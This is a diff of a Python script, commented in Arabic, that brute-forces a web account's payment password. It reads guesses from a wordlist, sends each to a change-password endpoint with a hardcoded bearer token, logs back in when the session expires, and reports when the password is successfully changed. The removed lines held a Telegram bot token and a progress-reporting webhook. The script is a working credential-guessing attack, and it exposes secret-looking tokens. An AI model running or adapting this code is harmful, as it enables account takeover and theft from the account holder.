@@ -1,12 +1,6 @@
 import requests
 import threading
 import time
-import flask
-from flask import Flask, request
-
-# بيانات تيليجرام
-telegram_bot_token = "8063782826:AAEruWcAysxIgW4l9KpQCywotiWEa3YJuZI"
-telegram_chat_id = "1701465279"
 
 # بيانات تسجيل الدخول
 login_data = {
@@ -17,7 +11,7 @@ login_data = {
 
 # متغيرات التقدم
 progress = 0  # عدد كلمات المرور المجربة
-is_running = True  # حالة البوت
+is_running = True  # حالة المحاولة
 
 # التوكن المستخدم في الطلبات
 token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"
@@ -29,12 +23,28 @@ headers = {
     'Authorization': f'Bearer {token}',
 }
 
-# دالة تجربة كلمة المرور
-def try_passwords():
+# قراءة كلمات المرور من ملف
+def load_passwords(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            passwords = file.read().splitlines()
+            print(f"✅ تم تحميل {len(passwords)} كلمة مرور من {file_path}")
+        return passwords
+    except FileNotFoundError:
+        print(f"⚠️ الملف {file_path} غير موجود.")
+        return []
+
+# دالة تجربة كلمات المرور
+def try_passwords(passwords):
     global progress, is_running, token
 
-    while is_running:
-        password = f"password-{progress + 1}"  # كلمة المرور التالية
+    if not passwords:
+        print("⚠️ لا توجد كلمات مرور للتجربة.")
+        return
+
+    while is_running and progress < len(passwords):
+        password = passwords[progress]  # كلمة المرور التالية من الملف
+        print(f"🔑 تجربة كلمة المرور رقم {progress + 1}: {password}")
         data = {
             'o_payword': password,
             'n_payword': '123123',
@@ -50,9 +60,14 @@ def try_passwords():
             # تحديث التقدم
             progress += 1
 
-            # إذا انتهت الجلسة، أعد تسجيل الدخول
-            if response_json.get("code") in [203, 204]:
+            # التحقق من نتيجة الطلب
+            if response_json.get("code") == 200:
+                print(f"✅ تم تغيير كلمة المرور بنجاح باستخدام: {password}")
+            elif response_json.get("code") in [203, 204]:
+                print("🔄 انتهت الجلسة، إعادة تسجيل الدخول...")
                 relogin()
+            else:
+                print(f"⚠️ فشل تغيير كلمة المرور. الرد: {response_json}")
 
         except requests.exceptions.RequestException as e:
             print(f"⚠️ خطأ أثناء إرسال الطلب: {e}")
@@ -69,41 +84,18 @@ def relogin():
             if "info" in result and "token" in result["info"]:
                 token = result["info"]["token"]
                 print(f"✅ تم الحصول على التوكن الجديد: {token}")
+        else:
+            print(f"⚠️ فشل تسجيل الدخول. الرد: {response.json()}")
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
 
-# إعداد Flask للاستماع إلى أوامر تيليجرام
-app = Flask(__name__)
-
-@app.route(f"/{telegram_bot_token}", methods=["POST"])
-def telegram_webhook():
-    global progress
-    data = request.get_json()
-
-    # تأكد من أن الرسالة تحتوي على نص
-    if "message" in data and "text" in data["message"]:
-        chat_id = data["message"]["chat"]["id"]
-        text = data["message"]["text"]
-
-        # عند استقبال أمر "ستارت"
-        if text.lower() == "start":
-            message = f"✅ البوت شغال! 🟢\nتم تجربة {progress} كلمة مرور حتى الآن."
-            send_telegram_message(chat_id, message)
-
-    return "OK", 200
-
-# دالة إرسال رسالة تيليجرام
-def send_telegram_message(chat_id, text):
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    data = {"chat_id": chat_id, "text": text}
-    try:
-        requests.post(url, json=data)
-    except requests.exceptions.RequestException as e:
-        print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
+# تحميل كلمات المرور من الملف
+passwords = load_passwords('passwordss.txt')
 
 # بدء تجربة كلمات المرور في Thread منفصل
-threading.Thread(target=try_passwords, daemon=True).start()
-
-# تشغيل Flask
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+if passwords:
+    threading.Thread(target=try_passwords, args=(passwords,), daemon=True).start()
+    while progress < len(passwords):
+        time.sleep(1)  # منع انتهاء البرنامج قبل اكتمال التجربة
+else:
+    print("⚠️ لم يتم العثور على كلمات مرور لتجربتها.")
